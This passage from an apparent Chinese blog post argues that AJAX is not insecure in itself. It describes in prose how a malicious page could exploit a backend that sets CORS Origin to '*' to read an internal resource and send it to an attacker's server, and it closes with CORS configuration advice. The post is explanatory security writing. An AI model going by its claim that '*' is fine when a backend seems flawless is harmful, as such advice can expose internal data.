</code></pre></div><p>然后用户访问了恶意网页，而像HTML之类的网页都是下载到本地执行的， 正好网页内有恶意代码，去向<code>192.168.111.23/users.md</code>请求资源，再将接收到的服务端返回发送到攻击者服务器。（因为加了Origin为*，而且AJAX是由本地浏览器发出的，所以用户下载到本地的恶意网站是可以访问到用户内网中的后台的）</p><p>然后这些敏感数据就这样被盗取了。</p><p>But，这是因为服务端漏洞而存在的问题，设置Origin<em>的后台上为何要放置敏感资源？正常设置为Origin</em>的最大作用是用作公共API。而且更重要的是，为何敏感资源就这样轻易的被获取了？为什么没有二次验证？</p><p>SO，后台本身有漏洞，所以才导致被攻击，AJAX恰好是攻击的手段之一（除了AJAX外还会有其它的方式），所以很多锅都甩到了AJAX头上。</p><p>这样，可以得出一个保守点的结论：</p><p><strong>Origin如果不是<code>\*</code>，AJAX请求并不会有安全问题，如果是<code>\*</code>，可能会由于后台的漏洞，不经意间，AJAX就被作为一种攻击手段了，导致了出现AJAX不安全的说法</strong></p><p><img src="/assets/07.cfdd3ef7.png" alt="07.png"></p><p>再看，AJAX请求真的不安全么？</p><p>仍然是最初的结论：</p><p><strong>如果某个Web应用具备良好的安全性，那么再怎么用“不安全的AJAX”也削弱不了它的安全性，反之如果应用本身存在漏洞，不管用何种技术请求，它都是不安全的</strong></p><p>我们可以看到，XSS也好，CSRF也好，以及其它隐藏的可能漏洞也好，本质上都是后台已有漏洞造成的问题，AJAX最多是被用作一种攻击手段（甚至某些里面AJAX还无法使用）</p><p>提到AJAX请求不安全的，譬如有CORS里面配置<code>Origin: *</code>造成某些极端情况下能通过AJAX发出攻击。但事实上这也是其中的一种攻击手段而已，没有AJAX，该不安全的仍然不安全。</p><p>譬如还有的说法是：因为在AJAX出现以前，如果出现安全漏洞，容易被察觉，但AJAX是异步的，更容易隐式的出现安全问题。。。这也与安全性的本质无关。</p><p>最重要一点，从Web应用安全角度来谈，Web应用必须从不信任客户端。所以不要再把锅甩给AJAX。</p><h2 id="ajax请求哪里不安全？" tabindex="-1">AJAX请求哪里不安全？ <a class="header-anchor" href="#ajax请求哪里不安全？" aria-hidden="true">#</a></h2><p>同上，AJAX本身并不存在这种安全问题。</p><p>不过有一点需注意，如果使用了CORS方案。</p><div class="language-markdown"><pre><code><span class="token list punctuation">1.</span> Allow-Origin可以设置特定的值，过滤特定的白名单

<span class="token list punctuation">2.</span> 对于一些公共的API，可以直接将Allow-Origin设置为<span class="token code-snippet code keyword">`*`</span>

<span class="token list punctuation">3.</span> 当然，如果确认后台没有这些隐藏漏洞，可以直接使用<span class="token code-snippet code keyword">`*`</span>，毕竟也只是针对浏览器的同源策略而已，影响没有那么大。
</code></pre></div><h3 id="怎么样让ajax请求更安全？" tabindex="-1">怎么样让AJAX请求更安全？ <a class="header-anchor" href="#怎么样让ajax请求更安全？" aria-hidden="true">#</a></h3><blockquote><p><strong>让Web后台更安全，则AJAX请求也更安全，反之后台有漏洞，不管怎么样都是不安全的</strong></p></blockquote></div>]]></content:encoded>
        </item>
    </channel>
</rss>